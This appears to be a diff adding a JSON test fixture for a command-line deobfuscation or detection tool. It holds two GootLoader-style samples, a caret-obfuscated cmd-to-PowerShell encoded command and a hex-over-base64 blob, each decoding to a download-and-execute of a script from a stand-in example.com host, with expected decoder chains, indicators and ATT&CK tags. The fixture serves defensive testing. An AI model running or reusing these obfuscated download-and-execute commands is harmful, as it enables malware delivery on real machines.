+          "variant": "cmd_caret_ps_enc_gootloader_style",
+          "input": "c^m^d /c p^ow^ers^he^ll -e^nc SQBFAFgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBnAGwALQBjAGEAcgBlAHQALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBnAGwAXwBjAGEAcgBlAHQALgBwAHMAMQAnACkAKQA=",
+          "expected": {
+            "interpreter": "cmd",
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "cmd-caret-strip",
+              "powershell-encoded-command",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-caret.example.com/gl_caret.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-caret.example.com/gl_caret.ps1"
+            ],
+            "mitre_attack": [
+              "T1059.001",
+              "T1059.003",
+              "T1105",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "cmd_to_ps_handoff",
+              "download_and_execute",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "2b29a7bc629bdfc30b0c8a8d72e293c8e1c6387b006d8f7e113d0a01447658c4",
+              "certificate_fingerprint": "10eb492cea5ffb8ba7122c7805a87b3d7f652e80ee53cf30bd93821f9002e295",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    },
+    {
+      "id": "nested_multi_layer_encoding",
+      "display_name": "Nested Multi-Layer Encoding (Hex\u2192Base64\u2192UTF-16LE)",
+      "description": "GootLoader wraps its stager in three sequential encodings (raw hex over base64 over UTF-16LE) as a single blob emitted by the JavaScript downloader.",
+      "mitre_attack": [
+        "T1027",
+        "T1140",
+        "T1059.001"
+      ],
+      "samples": [
+        {
+          "id": "GL022",
+          "variant": "hex_over_b64_over_utf16le",
+          "input": "53514246414667414941416f414367415467426c414863414c514250414749416167426c41474d4164414167414534415a514230414334415677426c414749415177427341476b415a514275414851414b51417541455141627742334147344162414276414745415a4142544148514163674270414734415a77416f41436341614142304148514163414136414338414c77426e414777414c51426f414755416541417541475541654142684147304163414273414755414c67426a41473841625141764147634162414266414767415a514234414334416341427a414445414a77417041436b41",
+          "expected": {
+            "interpreter": null,
+            "final_interpreter": "powershell",
+            "decoder_chain": [
+              "hex-decode",
+              "base64",
+              "utf-16le-decode",
+              "alias-expand"
+            ],
+            "final_output_contains": [
+              "Invoke-Expression",
+              "http://gl-hex.example.com/gl_hex.ps1"
+            ],
+            "iocs_contains": [
+              "http://gl-hex.example.com/gl_hex.ps1"
+            ],
+            "mitre_attack": [
+              "T1027",
+              "T1105",
+              "T1140",
+              "T1059.001"
+            ],
+            "behaviors": [
+              "multi_layer_obfuscation",
+              "download_and_execute"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "d647ca7db1b6dfaf36bc88387c74f31ae5e83312e4e2c469940a655f71e8b057",
+              "certificate_fingerprint": "f518c3794569e293ba4609c46b4cc8eae9c3e5e19d272404604a2725376c66b7",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T08:43:17+00:00"
+            }
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
